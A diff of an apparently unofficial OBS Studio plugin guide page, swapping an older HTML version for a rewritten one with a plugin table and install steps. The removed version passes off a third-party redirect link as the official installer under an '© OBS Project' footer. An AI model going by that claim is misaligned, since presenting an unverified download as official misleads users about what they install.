@@ -1,319 +1,61 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Must‑Have OBS Studio Plugins for Windows (and How to Install Them)</title>
-  <meta name="description" content="Top OBS Studio plugins for Windows and a simple installation guide. Learn where to install plugins, compatibility notes for OBS 28+ (Qt6), and quick fixes.">
-  <link rel="canonical" href="https://obs-studio-app.github.io/obs-studio-plugins-windows.html">
-
-  <!-- Open Graph / Twitter Card -->
-  <meta property="og:type" content="article">
-  <meta property="og:title" content="Must‑Have OBS Studio Plugins for Windows (and How to Install Them)">
-  <meta property="og:description" content="Top OBS plugins for Windows and how to install them safely. Includes compatibility notes and troubleshooting.">
-  <meta property="og:url" content="https://obs-studio-app.github.io/obs-studio-plugins-windows.html">
-  <meta property="og:image" content="https://obs-studio-app.github.io/og-image.png">
-  <meta name="twitter:card" content="summary_large_image">
-
-  <meta name="robots" content="index,follow">
-  <meta name="last-modified" content="">
-
-  <!-- Favicon & Apple -->
-  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
-  <link rel="icon" href="/favicon.ico">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-
-  <!-- GA4 (default consent: denied until user accepts) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MREFSP8YDP"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);} 
-    gtag('js', new Date());
-    gtag('consent', 'default', { 'analytics_storage': 'denied' });
-    gtag('config', 'G-MREFSP8YDP', { 'anonymize_ip': true });
-  </script>
-
-  <style>
-    :root{
-      --bg:#0f1115; --panel:#0f1720; --muted:#9aa6bb; --text:#e6e8eb; --accent:#5AA6FF; --accent-strong:#73B5FF; --success:#4ade80; --border:#1f2633; --focus:#FFD665;
-      --max-width:1100px; --radius:10px; --gap:18px; --container-padding:20px;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%;background:linear-gradient(180deg,var(--bg),#0b0d10);color:var(--text);margin:0}
-    a{color:var(--accent);text-decoration:none}
-    a:hover{color:var(--accent-strong)}
-    .wrap{max-width:var(--max-width);margin:24px auto;padding:var(--container-padding)}
-    header{display:flex;align-items:center;gap:12px}
-    .brand{display:flex;align-items:center;gap:12px}
-    .brand h1{font-size:18px;margin:0}
-    nav{margin-left:auto}
-    nav ul{display:flex;gap:10px;list-style:none;padding:0;margin:0}
-    nav a{padding:8px 10px;border-radius:8px;background:transparent}
-    nav a:focus{outline:3px solid var(--focus);outline-offset:2px}
-
-    main{display:grid;grid-template-columns:1fr 360px;gap:24px;margin-top:22px}
-    @media(max-width:900px){main{grid-template-columns:1fr} .sidebar{order:2}}
-
-    .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border:1px solid var(--border);padding:18px;border-radius:var(--radius)}
-    .hero{display:flex;flex-direction:column;gap:14px}
-    .small{font-size:13px;color:var(--muted)}
-    .muted{color:var(--muted)}
-    .meta{display:flex;gap:12px;align-items:center;font-size:13px;color:var(--muted)}
-    .cta{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
-    .btn{background:var(--accent);color:#041025;padding:12px 16px;border-radius:10px;font-weight:600;border:none;cursor:pointer}
-    .btn:hover{background:var(--accent-strong)}
-    .btn:focus{outline:3px solid var(--focus);outline-offset:2px}
-    .btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text);padding:10px;border-radius:10px}
-
-    .grid{display:grid;gap:14px}
-    @media(min-width:920px){.grid.cols-2{grid-template-columns:1fr 1fr}}
-
-    ul.small{padding-left:18px}
-    footer{margin-top:28px;color:var(--muted);font-size:13px}
-
-    .svgic{width:18px;height:18px;vertical-align:middle}
-
-    /* cookie banner */
-    .cookie-banner{position:fixed;left:16px;right:16px;bottom:16px;background:linear-gradient(180deg,#0f1621, #07101a);border:1px solid var(--border);padding:12px;border-radius:12px;display:flex;gap:12px;align-items:center;z-index:999}
-    .cookie-banner p{margin:0;color:var(--muted);font-size:14px}
-    .cookie-actions{margin-left:auto;display:flex;gap:8px}
-
-    .tag{display:inline-block;padding:4px 8px;border:1px solid var(--border);border-radius:999px;font-size:12px;color:var(--muted)}
-  </style>
-
-  <!-- Structured Data: HowTo (Install Plugins) + FAQ + Breadcrumbs -->
-  <script type="application/ld+json">
-  {
-    "@context":"https://schema.org",
-    "@type":"HowTo",
-    "name":"Install OBS Studio Plugins on Windows",
-    "about":{
-      "@type":"SoftwareApplication",
-      "name":"OBS Studio for Windows",
-      "softwareVersion":"32.1.2",
-      "operatingSystem":["Windows 11 (64-bit)","Windows 10 (64-bit)"],
-      "applicationCategory":"MultimediaApplication"
-    },
-    "totalTime":"PT5M",
-    "supply":[{"@type":"HowToSupply","name":"Plugin installer (.exe) or ZIP archive"}],
-    "tool":[{"@type":"HowToTool","name":"Administrator account"}],
-    "step":[
-      {"@type":"HowToStep","name":"Get the plugin from a trusted source","text":"Prefer the OBS Forum Resources section or the plugin's official GitHub."},
-      {"@type":"HowToStep","name":"Use the installer when available","text":"Run the plugin's .exe if provided and follow on‑screen steps. Close OBS before installing."},
-      {"@type":"HowToStep","name":"Manual ZIP install (advanced)","text":"Extract ZIP and copy plugin files into C:\\Program Files\\obs-studio\\obs-plugins\\64bit and related data into C:\\Program Files\\obs-studio\\data\\obs-plugins\\<plugin>."},
-      {"@type":"HowToStep","name":"Launch OBS and verify","text":"Open OBS → Tools/Filters or the relevant menu. Confirm the plugin appears and works."}
-    ]
-  }
-  </script>
-
-  <script type="application/ld+json">
-  {
-    "@context":"https://schema.org",
-    "@type":"FAQPage",
-    "mainEntity":[
-      {"@type":"Question","name":"Where do OBS plugins go on Windows?","acceptedAnswer":{"@type":"Answer","text":"Typically in C:\\Program Files\\obs-studio\\obs-plugins\\64bit (binaries) and C:\\Program Files\\obs-studio\\data\\obs-plugins\\<plugin> (data). When available, prefer plugin installers that place files correctly."}},
-      {"@type":"Question","name":"Are OBS 28+ plugins different?","acceptedAnswer":{"@type":"Answer","text":"Yes. OBS 28+ moved to Qt6 and a new API; older plugins may be incompatible. Download builds labeled for OBS 28+ (or your exact version)."}},
-      {"@type":"Question","name":"Do I still need obs-websocket?","acceptedAnswer":{"@type":"Answer","text":"No. obs-websocket is integrated in modern OBS versions (28+). Only install it separately if a tool requires a specific external build."}}
-    ]
-  }
-  </script>
-
-  <script type="application/ld+json">
-  {
-    "@context":"https://schema.org",
-    "@type":"BreadcrumbList",
-    "itemListElement":[
-      {"@type":"ListItem","position":1,"name":"Home","item":"https://obs-studio-app.github.io"},
-      {"@type":"ListItem","position":2,"name":"Plugins","item":"https://obs-studio-app.github.io/obs-studio-plugins-windows.html"}
-    ]
-  }
-  </script>
-
-</head>
-<body>
-  <div class="wrap">
-    <header>
-      <div class="brand" aria-label="OBS Studio for Windows">
-        <svg width="40" height="40" viewBox="0 0 24 24" aria-hidden="true">
-          <defs>
-            <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
-              <stop offset="0" stop-color="#5AA6FF" />
-              <stop offset="1" stop-color="#3AAAAF" />
-            </linearGradient>
-          </defs>
-          <rect width="100%" height="100%" rx="6" fill="url(#g)"></rect>
-          <text x="12" y="16" font-size="10" font-family="Arial" text-anchor="middle" fill="#041025">OBS</text>
-        </svg>
-        <div>
-          <h1>OBS Plugins for Windows</h1>
-          <div class="small muted">Must‑have add‑ons + safe install guide (OBS 32.1.2)</div>
-        </div>
-      </div>
-      <nav aria-label="Main navigation">
-        <ul>
-          <li><a href="/">Download</a></li>
-          <li><a href="install-obs-studio-windows.html">Install</a></li>
-          <li><a href="obs-studio-best-settings-windows.html">Best Settings</a></li>
-          <li><a href="obs-studio-troubleshooting-windows.html">Troubleshooting</a></li>
-          <li><a href="obs-studio-plugins-windows.html" aria-current="page">Plugins</a></li>
-          <li><a href="obs-studio-low-end-windows.html">Low‑End</a></li>
-          <li><a href="obs-vs-streamlabs-windows.html">Compare</a></li>
-        </ul>
-      </nav>
-    </header>
-
-    <main>
-      <section class="card hero">
-        <div class="meta">
-          <svg class="svgic" aria-hidden><use href="#icon-puzzle"></use></svg>
-          <div class="small">Windows 10/11 (64‑bit) • OBS 32.1.2 • Compatible plugins</div>
-        </div>
-        <h2>Must‑Have OBS Studio Plugins for Windows</h2>
-        <p class="muted">Supercharge your workflow with tested, widely‑used plugins. Always download from trusted sources and make sure the build matches your OBS version and architecture (x64).</p>
-
-        <div class="cta">
-          <a class="btn" id="download-btn" href="https://www2.softwareportal.store/sxExuOEd" target="_blank" rel="noopener" onclick="trackDownload(event)">Download OBS Studio (Windows x64)</a>
-          <a class="btn-ghost" href="obs-studio-best-settings-windows.html">Best Settings</a>
-          <a class="btn-ghost" href="obs-studio-troubleshooting-windows.html">Troubleshooting</a>
-        </div>
-
-        <div class="grid cols-2" style="margin-top:14px">
-          <div class="card">
-            <h3 style="margin:0 0 8px">Popular plugins to consider</h3>
-            <ul class="small">
-              <li><strong>Move Transition:</strong> Smoothly animate sources and scenes with motion.</li>
-              <li><strong>StreamFX:</strong> Advanced filters (blur, 3D transform, SDF effects). Check version compatibility for OBS 28+.</li>
-              <li><strong>OBS Shaderfilter (Plus):</strong> Add custom shader effects to sources.</li>
-              <li><strong>Audio Monitor:</strong> Route audio to monitors with more control.</li>
-              <li><strong>Downstream Keyer / Source Dock:</strong> Flexible docks and keying workflows.</li>
-            </ul>
-            <p class="small muted">Tip: Browse the official <a href="https://obsproject.com/forum/resources/categories/obs-studio-plugins.6/" target="_blank" rel="noopener">OBS Forum Plugins</a> for vetted releases.</p>
-          </div>
-          <div class="card">
-            <h3 style="margin:0 0 8px">Compatibility checklist</h3>
-            <ul class="small">
-              <li>OBS 28+ uses <strong>Qt6</strong>; older plugin builds may not work.</li>
-              <li>Use <strong>x64</strong> plugin builds for Windows 64‑bit.</li>
-              <li>Prefer plugins with active maintenance and clear release notes.</li>
-              <li>Back up your OBS profile/scene collection before testing new plugins.</li>
-            </ul>
-            <span class="tag">No adware • Trusted sources only</span>
-          </div>
-        </div>
-
-        <div class="card" style="margin-top:14px">
-          <h3 style="margin:0 0 8px">How to install plugins (Windows)</h3>
-          <ol class="small">
-            <li><strong>Download</strong> a plugin from a trusted source (OBS Forum/GitHub). If an <strong>installer (.exe)</strong> is provided, use it.</li>
-            <li><strong>Close OBS</strong> before installing. Run the installer with admin rights.</li>
-            <li><strong>Manual ZIP</strong>: extract and copy binaries to <code>C:\Program Files\obs-studio\obs-plugins\64bit</code> and data to <code>C:\Program Files\obs-studio\data\obs-plugins\&lt;plugin&gt;</code>.</li>
-            <li><strong>Launch OBS</strong> → check <em>Tools</em>, <em>Filters</em>, or the relevant menu for the plugin.</li>
-          </ol>
-        </div>
-
-        <div class="card" style="margin-top:12px">
-          <h3 style="margin-top:0">Quick FAQ</h3>
-          <p><strong>Q:</strong> Where is the plugins folder?<br><strong>A:</strong> <code>C:\Program Files\obs-studio\obs-plugins\64bit</code> and <code>...\data\obs-plugins\&lt;plugin&gt;</code> for data files.</p>
-          <p><strong>Q:</strong> OBS crashes after adding a plugin?<br><strong>A:</strong> Remove the plugin from the folder, relaunch OBS, and install a build compatible with your version.</p>
-          <p><strong>Q:</strong> Do I need obs-websocket?<br><strong>A:</strong> It's built‑in on OBS 28+; only install separately if specifically required.</p>
-        </div>
-      </section>
-
-      <aside class="sidebar card">
-        <div>
-          <strong>Need the installer?</strong>
-          <div class="small muted">OBS-Studio-32.1.2-Windows-x64-Installer.exe</div>
-          <a class="btn" id="download-side" href="https://www2.softwareportal.store/sxExuOEd" target="_blank" rel="noopener" onclick="trackDownload(event)">
-            <svg class="svgic" aria-hidden><use href="#icon-download"></use></svg> Download (Official)
-          </a>
-          <div class="small muted" style="margin-top:8px">Windows 10/11 (64‑bit) • No adware</div>
-          <div style="margin-top:10px">
-            <div class="small muted">Share link</div>
-            
-          </div>
-        </div>
-
-        <div style="margin-top:14px" class="card small muted">
-          <div>Last updated: <time id="lastmod"></time></div>
-          <div style="margin-top:6px">Version: <strong>32.1.2</strong></div>
-          <div style="margin-top:6px">See also: <a href="obs-studio-best-settings-windows.html">Best Settings</a> • <a href="obs-studio-low-end-windows.html">Low‑End PCs</a></div>
-        </div>
-      </aside>
-    </main>
-
-    <footer>
-      <div class="small muted">© OBS Project — this page links to the official installer. We do not host or modify the executable. Privacy & policy available on the official site.</div>
-    </footer>
-  </div>
-
-  <!-- SVG sprite -->
-  <svg style="display:none">
-    <symbol id="icon-download" viewBox="0 0 24 24"><path fill="currentColor" d="M5 20h14v-2H5v2zm7-18L5.33 9h3.67v6h6V9h3.67L12 2z"/></symbol>
-    <symbol id="icon-puzzle" viewBox="0 0 24 24"><path fill="currentColor" d="M22 13v-2h-2.06a3 3 0 0 0-5.88 0H12V7h3a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1h-3v2H9a3 3 0 0 0-6 0H1v4a1 1 0 0 0 1 1h3v4H2a1 1 0 0 0-1 1v4h2.06a3 3 0 0 0 5.88 0H12v-4h2.06a3 3 0 0 0 5.88 0H22v-2z"/></symbol>
-  </svg>
-
-  <!-- Cookie banner -->
-  <div id="cookie" class="cookie-banner" role="dialog" aria-live="polite" aria-label="Cookie consent" style="display:none">
-    <div>
-      <strong>We use cookies</strong>
-      <p style="margin:6px 0 0">Analytics are used to improve this site. Accept to enable GA4. You can decline — the download will still work.</p>
-    </div>
-    <div class="cookie-actions">
-      <button id="cookie-accept" class="btn">Accept</button>
-      <button id="cookie-decline" class="btn-ghost">Decline</button>
-      <button id="cookie-close" class="btn-ghost" aria-label="Close cookie banner">Close</button>
-    </div>
-  </div>
-
-  <script>
-    // Installer details
-    const FILE_NAME = 'OBS-Studio-32.1.2-Windows-x64-Installer.exe';
-    const FILE_URL = 'https://cdn-fastly.obsproject.com/downloads/OBS-Studio-32.1.2-Windows-x64-Installer.exe';
-
-    // Track download event
-    function trackDownload(e){
-      try{
-        gtag('event','file_download',{event_category:'downloads', event_label:FILE_NAME, file_url:FILE_URL});
-      }catch(err){console.warn('gtag not available',err)}
-    }
-
-    // Cookie consent logic
-    const banner = document.getElementById('cookie');
-    const ACCEPT = document.getElementById('cookie-accept');
-    const DECLINE = document.getElementById('cookie-decline');
-    const CLOSE = document.getElementById('cookie-close');
-
-    function setConsent(value){
-      localStorage.setItem('cookie_consent', value);
-      if(value === 'accepted'){
-        try{ gtag('consent','update',{'analytics_storage':'granted'}); }catch(e){}
-      } else {
-        try{ gtag('consent','update',{'analytics_storage':'denied'}); }catch(e){}
-      }
-      banner.style.display = 'none';
-    }
-
-    ACCEPT.addEventListener('click',()=> setConsent('accepted'));
-    DECLINE.addEventListener('click',()=> setConsent('declined'));
-    CLOSE.addEventListener('click',()=> banner.style.display='none');
-
-    (function(){
-      const consent = localStorage.getItem('cookie_consent');
-      if(!consent){ banner.style.display = 'flex'; }
-      else if(consent === 'accepted'){
-        try{ gtag('consent','update',{'analytics_storage':'granted'}); }catch(e){}
-      } else { try{ gtag('consent','update',{'analytics_storage':'denied'}); }catch(e){} }
-    })();
-
-    // last modified
-    (function(){
-      const t = document.getElementById('lastmod');
-      if(t){ t.textContent = document.lastModified || new Date().toISOString().split('T')[0]; }
-      const m = document.querySelector('meta[name="last-modified"]');
-      if(m){ m.setAttribute('content', document.lastModified || new Date().toISOString()); }
-    })();
-  </script>
-
-</body>
-</html>
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Best OBS Studio Plugins for Windows — Install Guide 2026</title>
+<meta name="description" content="Best OBS Studio plugins for Windows: obs-move-transition, obs-ndi, StreamFX, background removal. How to install OBS plugins on Windows 11.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://obs-studio-app.github.io/obs-studio-plugins-windows.html">
+<meta name="last-modified" content="2026-06-10">
+<meta property="og:title" content="Best OBS Studio Plugins for Windows — Install Guide 2026">
+<meta property="og:description" content="Best OBS Studio plugins for Windows: obs-move-transition, obs-ndi, StreamFX, background removal. How to install OBS plugins on Windows 11.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://obs-studio-app.github.io/obs-studio-plugins-windows.html">
+<meta property="og:image" content="https://obs-studio-app.github.io/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="icon" href="/favicon.svg">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="stylesheet" href="/style.css">
+</head><body>
+<nav class="site-nav"><div class="wrap"><div class="nav-inner"><a href="/index.html" class="nav-logo"><div class="nav-logo-mark">OBS</div><span class="nav-logo-name">OBS Studio</span><span class="nav-logo-sub">for Windows</span></a><div class="nav-links"><a href="/index.html" id="nl-home">Download</a><a href="/install-obs-studio-windows.html" id="nl-install">Install</a><a href="/obs-studio-plugins-windows.html" id="nl-plugins">Plugins</a><a href="/obs-studio-best-settings-windows.html" id="nl-settings">Settings</a><a href="/obs-studio-troubleshooting-windows.html" id="nl-fix">Fix errors</a><a href="/obs-studio-windows-faq.html" id="nl-faq">FAQ</a></div><a href="/obs-studio-download-windows.html" class="nav-cta"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Download</a></div></div></nav>
+<div class="page-hero"><div class="wrap">
+<nav class="breadcrumb"><a href="/index.html">home</a> <span>/</span> <span>obs-studio-plugins-windows</span></nav>
+<span class="page-tag">Plugins guide</span>
+<h1>Best OBS Studio plugins for Windows &mdash; <span>install guide 2026</span></h1>
+<div class="answer-box">OBS Studio plugins extend recording and streaming with new features. Install plugins by placing files in <code>C:\Program Files\obs-studio\obs-plugins\</code> or using the installer. The most popular: <strong>obs-move-transition</strong>, <strong>obs-ndi</strong>, <strong>Spectralizer</strong> and <strong>StreamFX</strong>.</div>
+</div></div>
+<div class="wrap"><div class="content-layout">
+<main><div class="section"><span class="section-label">Best plugins</span><h2>Best OBS Studio plugins for Windows 2026</h2>
+<div class="tbl-wrap"><table><thead><tr><th>Plugin</th><th>What it does</th><th>Free</th></tr></thead><tbody>
+<tr><td><strong>obs-move-transition</strong></td><td>Smooth animated transitions between scenes</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>obs-ndi</strong></td><td>Network streaming between OBS instances via NDI</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>Spectralizer</strong></td><td>Audio visualiser source — reacts to music</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>StreamFX</strong></td><td>Advanced effects: blur, 3D transform, shader filters</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>obs-backgroundremoval</strong></td><td>AI background removal without green screen</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>Source Clone</strong></td><td>Duplicate sources across scenes without reconfig</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>Downstream Keyer</strong></td><td>Overlay that persists across all scenes</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>obs-midi</strong></td><td>Control OBS with MIDI controllers</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>Closed Captioning</strong></td><td>Auto subtitles via Google Speech API</td><td class="td-ok">Yes</td></tr>
+<tr><td><strong>obs-freeze-filter</strong></td><td>Freeze a source on command</td><td class="td-ok">Yes</td></tr>
+</tbody></table></div>
+</div>
+<div class="section"><span class="section-label">How to install</span><h2>How to install OBS plugins on Windows</h2><ul class="steps">
+<li class="step"><div class="step-n">1</div><div><h3>Download the plugin</h3><p>Most OBS plugins are on GitHub. Download the Windows release (.zip or .exe installer). Check the GitHub Releases page for the latest version.</p></div></li>
+<li class="step"><div class="step-n">2</div><div><h3>Run the installer (if provided)</h3><p>Many plugins come with an installer .exe. Run it and it places files in the correct location automatically.</p></div></li>
+<li class="step"><div class="step-n">3</div><div><h3>Manual install (ZIP)</h3><p>For ZIP plugins: extract and copy <code>plugin-name.dll</code> to <code>C:\Program Files\obs-studio\obs-plugins\64bit\</code> and any data files to <code>C:\Program Files\obs-studio\data\obs-plugins\plugin-name\</code>.</p></div></li>
+<li class="step"><div class="step-n">4</div><div><h3>Restart OBS</h3><p>Close and reopen OBS Studio. The plugin appears in the sources, filters or transitions list depending on its type.</p></div></li>
+</ul></div>
+<div class="term"><div class="term-bar"><div class="term-dot" style="background:#ff5f56"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#27c93f"></div><span class="term-label">Plugin folder paths</span></div><div class="term-body"><div><span class="t-cm"># 64-bit plugin DLLs:</span></div><div><span class="t-v">C:\Program Files\obs-studio\obs-plugins\64bit\</span></div><div></div><div><span class="t-cm"># Plugin data/assets:</span></div><div><span class="t-v">C:\Program Files\obs-studio\data\obs-plugins\</span></div><div></div><div><span class="t-cm"># User-specific plugins (no admin required):</span></div><div><span class="t-v">%APPDATA%\obs-studio\plugins\</span></div></div></div>
+<div class="section"><span class="section-label">FAQ</span><h2>Plugin questions</h2><div class="faq">
+<div class="faq-item"><details><summary>How to install OBS plugins Windows 11 &mdash; step by step</summary><div class="faq-ans"><p>Download the plugin ZIP or installer from the plugin's GitHub page. If it has an .exe installer, run it. For ZIP: extract the .dll to <code>C:\Program Files\obs-studio\obs-plugins\64bit\</code> and data files to <code>C:\Program Files\obs-studio\data\obs-plugins\plugin-name\</code>. Restart OBS. The plugin appears in sources/filters/transitions.</p></div></details></div>
+<div class="faq-item"><details><summary>OBS plugin not showing after install</summary><div class="faq-ans"><p>Check: (1) the .dll is in the correct 64bit folder, (2) you restarted OBS completely, (3) the plugin requires data files that are missing. Some plugins also appear in different menus &mdash; transitions plugins appear in the Scene Transitions panel, filter plugins in source filters.</p></div></details></div>
+<div class="faq-item"><details><summary>OBS plugins download &mdash; where to find them?</summary><div class="faq-ans"><p>The best sources: the OBS forum at obsproject.com/forum, the obs-studio-community GitHub organisation, and individual plugin GitHub repos. Always download from the official plugin repository to avoid malware.</p></div></details></div>
+</div></div>
+<div class="cta-banner"><div><h2>Plugin crashing OBS?</h2><p>Troubleshooting guide for OBS errors.</p></div><a href="/obs-studio-troubleshooting-windows.html" class="btn-cta-accent"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Troubleshooting</a></div>
+<div style="margin-bottom:24px"><span class="section-label">Related guides</span><div class="rel-grid"><a href="/obs-studio-troubleshooting-windows.html" class="rel-card"><div class="rel-title">Troubleshooting &rarr;</div><div class="rel-sub">fix errors</div></a><a href="/obs-studio-best-settings-windows.html" class="rel-card"><div class="rel-title">Best settings &rarr;</div><div class="rel-sub">streaming & recording</div></a><a href="/obs-studio-virtual-camera-windows.html" class="rel-card"><div class="rel-title">Virtual camera &rarr;</div><div class="rel-sub">OBS as webcam</div></a></div></div></main>
+<aside class="content-sidebar"><div class="sb-ver"><div class="sb-ver-label">Latest version</div><div class="sb-ver-val">31.0.3</div><div class="sb-ver-sub">Windows 10 / 11 · Free</div></div><div class="sb-card"><div class="sb-card-title">Install</div><ul class="sb-links"><li><a href="/obs-studio-download-windows.html">Download OBS Studio</a></li><li><a href="/install-obs-studio-windows.html">Install guide</a></li><li><a href="/obs-studio-system-requirements-windows.html">System requirements</a></li><li><a href="/obs-studio-windows-11.html">Windows 11</a></li><li><a href="/obs-studio-update-windows.html">Update OBS</a></li></ul></div><div class="sb-card"><div class="sb-card-title">Setup</div><ul class="sb-links"><li><a href="/obs-studio-best-settings-windows.html">Best settings</a></li><li><a href="/obs-studio-streaming-settings-windows.html">Streaming settings</a></li><li><a href="/obs-studio-recording-settings-windows.html">Recording settings</a></li><li><a href="/obs-studio-audio-setup-windows.html">Audio setup</a></li><li><a href="/obs-studio-scenes-sources-windows.html">Scenes & sources</a></li><li><a href="/obs-studio-game-capture-windows.html">Game capture</a></li><li><a href="/obs-studio-virtual-camera-windows.html">Virtual camera</a></li></ul></div><div class="sb-card"><div class="sb-card-title">Plugins & fix</div><ul class="sb-links"><li><a href="/obs-studio-plugins-windows.html" class="cur">Plugins</a></li><li><a href="/obs-studio-troubleshooting-windows.html">Troubleshooting</a></li><li><a href="/obs-studio-black-screen-windows.html">Black screen fix</a></li><li><a href="/obs-studio-not-recording-windows.html">Not recording</a></li><li><a href="/obs-studio-low-end-windows.html">Low-end PC</a></li><li><a href="/obs-vs-streamlabs-windows.html">OBS vs Streamlabs</a></li><li><a href="/obs-studio-windows-faq.html">FAQ</a></li></ul></div></aside>
+</div></div>
+<footer class="site-footer"><div class="wrap"><div class="footer-inner"><div><div class="footer-logo"><div class="footer-logo-mark">OBS</div><span class="footer-logo-name">OBS Studio for Windows</span></div><p class="footer-tagline">Unofficial Windows guide &mdash; not affiliated with the OBS Project.</p></div><div><div class="footer-col-title">Install</div><ul class="footer-links"><li><a href="/obs-studio-download-windows.html">Download OBS Studio</a></li><li><a href="/install-obs-studio-windows.html">Install guide</a></li><li><a href="/obs-studio-system-requirements-windows.html">System requirements</a></li><li><a href="/obs-studio-windows-11.html">Windows 11 guide</a></li><li><a href="/obs-studio-update-windows.html">Update OBS</a></li></ul></div><div><div class="footer-col-title">Setup</div><ul class="footer-links"><li><a href="/obs-studio-best-settings-windows.html">Best settings</a></li><li><a href="/obs-studio-streaming-settings-windows.html">Streaming settings</a></li><li><a href="/obs-studio-recording-settings-windows.html">Recording settings</a></li><li><a href="/obs-studio-audio-setup-windows.html">Audio setup</a></li><li><a href="/obs-studio-scenes-sources-windows.html">Scenes &amp; sources</a></li><li><a href="/obs-studio-game-capture-windows.html">Game capture</a></li><li><a href="/obs-studio-virtual-camera-windows.html">Virtual camera</a></li></ul></div><div><div class="footer-col-title">Help</div><ul class="footer-links"><li><a href="/obs-studio-plugins-windows.html">Plugins</a></li><li><a href="/obs-studio-troubleshooting-windows.html">Troubleshooting</a></li><li><a href="/obs-studio-black-screen-windows.html">Black screen fix</a></li><li><a href="/obs-studio-not-recording-windows.html">Not recording</a></li><li><a href="/obs-studio-low-end-windows.html">Low-end PC</a></li><li><a href="/obs-vs-streamlabs-windows.html">OBS vs Streamlabs</a></li><li><a href="/obs-studio-windows-faq.html">FAQ</a></li></ul></div></div><div class="footer-bottom"><p>Not affiliated with the OBS Project. OBS Studio is open source software. Unofficial community guide.</p><p><strong>Affiliate disclosure:</strong> Download links may be partner links.</p></div></div></footer><div class="cookie-bar" id="cookieBar" style="display:none"><p>We use Google Analytics for anonymous traffic data. <a href="/obs-studio-windows-faq.html">Privacy</a></p><div class="cookie-btns"><button class="cookie-accept" id="cookieAccept">Accept</button><button class="cookie-decline" id="cookieDecline">Decline</button></div></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-MREFSP8YDP"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("consent","default",{analytics_storage:"denied",ad_storage:"denied"});gtag("js",new Date());gtag("config","G-MREFSP8YDP",{anonymize_ip:true,send_page_view:false});function grantGA(){gtag("consent","update",{analytics_storage:"granted"});gtag("event","page_view",{page_location:location.href,page_title:document.title})}document.addEventListener("DOMContentLoaded",function(){var bar=document.getElementById("cookieBar"),c=localStorage.getItem("obs_consent");if(!c){bar.style.display="flex"}else if(c==="1"){grantGA()}document.getElementById("cookieAccept").onclick=function(){localStorage.setItem("obs_consent","1");grantGA();bar.style.display="none"};document.getElementById("cookieDecline").onclick=function(){localStorage.setItem("obs_consent","0");bar.style.display="none"};});</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"HowTo","name":"Install OBS Studio Plugins on Windows","step":[{"@type":"HowToStep","position":1,"name":"Download plugin","text":"Download .zip or .exe installer from the plugin GitHub page"},{"@type":"HowToStep","position":2,"name":"Install","text":"Run .exe or copy .dll to C:\\Program Files\\obs-studio\\obs-plugins\\64bit\\"},{"@type":"HowToStep","position":3,"name":"Restart OBS","text":"Close and reopen OBS Studio"}]}</script>
+<script>var el=document.getElementById("nl-plugins");if(el)el.classList.add("active");</script>
+</body></html>
